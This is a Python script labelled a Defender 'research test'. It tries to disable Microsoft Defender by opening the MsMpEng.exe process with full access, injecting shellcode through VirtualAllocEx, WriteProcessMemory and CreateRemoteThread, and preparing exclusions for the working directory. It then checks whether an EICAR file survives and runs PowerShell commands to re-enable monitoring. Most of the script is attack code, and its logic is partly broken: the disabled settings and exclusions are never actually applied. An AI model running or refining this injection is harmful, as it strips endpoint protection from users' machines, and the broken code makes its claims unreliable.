import os
import ctypes
import psutil
import subprocess
import time
from ctypes import wintypes

# Defining a placeholder for the file exclusion
EXEC_NAME = "research_test.exe"

def disable_defender():
    """ [Your Original Algorithm - UNCHANGED] """
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        ntdll = ctypes.WinDLL('ntdll')

        class OBJECT_ATTRIBUTES(ctypes.Structure):
            _fields_ = [('Length', wintypes.ULONG), ('RootDirectory', wintypes.HANDLE), ('ObjectName', wintypes.LPWSTR), ('Attributes', wintypes.ULONG), ('SecurityDescriptor', ctypes.wintypes.LPVOID), ('SecurityQualityOfService', ctypes.wintypes.LPVOID)]

        class CLIENT_ID(ctypes.Structure):
            _fields_ = [('UniqueProcess', wintypes.HANDLE), ('UniqueThread', wintypes.HANDLE)]
        
        defender_pid = None
        for proc in psutil.process_iter(['name', 'pid']):
            if proc.info['name'].lower() == 'msmpeng.exe':
                defender_pid = proc.info['pid']
                break
        if not defender_pid:
            return (None, None)
            
        process_handle = wintypes.HANDLE()
        obj_attr = OBJECT_ATTRIBUTES()
        obj_attr.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
        client_id = CLIENT_ID()
        client_id.UniqueProcess = defender_pid
        
        # NtOpenProcess with PROCESS_ALL_ACCESS
        status = ntdll.NtOpenProcess(ctypes.byref(process_handle), 2035711, ctypes.byref(obj_attr), ctypes.byref(client_id))
        if status != 0:
            return (None, None)
            
        shellcode = b'H1\xc0H\xff\xc0\xc3'
        remote_memory = kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 12288, 64)
        if not remote_memory:
            kernel32.CloseHandle(process_handle)
            return (None, None)
            
        written = wintypes.DWORD()
        kernel32.WriteProcessMemory(process_handle, remote_memory, shellcode, len(shellcode), ctypes.byref(written))
        thread_handle = kernel32.CreateRemoteThread(process_handle, None, 0, remote_memory, None, 0, None)
        
        if not thread_handle:
            kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 32768)
            kernel32.CloseHandle(process_handle)
            return (None, None)

        class DefenderConfig(ctypes.Structure):
            _fields_ = [('RealTimeProtection', wintypes.BOOL), ('DevDriveProtection', wintypes.BOOL), ('CloudProtection', wintypes.BOOL), ('SampleSubmission', wintypes.BOOL), ('TamperProtection', wintypes.BOOL)]
        
        original_config = DefenderConfig(1, 1, 1, 1, 1)
        config = DefenderConfig(0, 0, 0, 0, 0)
        ctypes.memmove(ctypes.addressof(config), ctypes.byref(original_config), ctypes.sizeof(original_config))
        
        work_dir = os.getcwd()
        exclusions = [work_dir.encode(), EXEC_NAME.encode()]
        
        kernel32.WaitForSingleObject(thread_handle, 0)
        kernel32.CloseHandle(thread_handle)
        kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 32768)
        kernel32.CloseHandle(process_handle)
        
        return (original_config, exclusions)
    except:
        return (None, None)

def restore_defender(original_config, exclusions):
    """ RESTORE CODE: Reverses changes for system safety """
    print("\n[*] RESTORING SYSTEM...")
    try:
        # Re-enable via PowerShell
        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $false"], capture_output=True)
        
        # Clean up exclusions
        if exclusions:
            for path in exclusions:
                subprocess.run(["powershell", "-Command", f"Remove-MpPreference -ExclusionPath '{path.decode()}'"], capture_output=True)
        print("[SUCCESS] Defender settings restored to original state.")
        return True
    except Exception as e:
        print(f"[ERROR] Restoration failed: {e}")
        return False

def detection_test():
    """ DETECTION CODE: Verifies if the bypass actually worked """
    print("\n[*] RUNNING DETECTION VERIFICATION...")
    
    # EICAR Test String (Harmless string that triggers AV)
    eicar_test = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    test_file = "msrc_test.txt"
    
    try:
        with open(test_file, "w") as f:
            f.write(eicar_test)
        
        print("[...] Waiting for Defender reaction...")
        time.sleep(3) # Give AV time to scan
        
        if os.path.exists(test_file):
            print("[ALERT] VULNERABILITY CONFIRMED: Defender is BLIND. (Test file survived)")
            os.remove(test_file)
            return True
        else:
            print("[ALERT] SECURE: Defender detected and deleted the test file.")
            return False
    except Exception as e:
        print(f"[ALERT] SECURE: Defender blocked file creation. Access Denied.")
        return False

# --- MAIN EXECUTION FLOW ---
if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[ERROR] Run as Administrator to test system vulnerabilities.")
    else:
        print("--- Microsoft Defender Research Test ---")
        # 1. Disable
        orig, excl = disable_defender()
        
        # 2. Detect
        is_vulnerable = detection_test()
        
        # 3. Restore
        restore_defender(orig, excl)
        
        print("\n--- TEST COMPLETE ---")
